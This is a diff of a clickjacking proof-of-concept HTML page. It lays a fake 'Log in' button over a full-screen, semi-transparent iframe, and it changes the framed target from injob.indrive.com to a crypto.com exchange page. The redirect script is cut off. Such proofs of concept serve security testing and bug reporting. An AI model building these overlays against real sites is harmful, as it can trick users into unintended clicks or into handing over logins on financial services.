@@ -14,7 +14,7 @@
             color: red;
         }
 
-        
+       
         .fake-login {
             position: absolute;
             top: 50px;
@@ -29,23 +29,23 @@
             z-index: 10; 
         }
 
-        /* Iframe target */
+    
         iframe {
             position: absolute;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            opacity: 0.8; 
-            pointer-events: auto; 
+            opacity: 0.8;
+            pointer-events: auto;
             z-index: 5;
         }
     </style>
 </head>
 <body>
     <h2>PoC Clickjacking - injob.indrive.com</h2>
-    <button class="fake-login" onclick="redirect()">Login</button> 
-    <iframe src="https://injob.indrive.com/"></iframe> <!-- Target -->
+    <button class="fake-login" onclick="redirect()">Log in</button>
+    <iframe src="https://crypto.com/exchange"></iframe>
 
     <script>
         function redirect() {
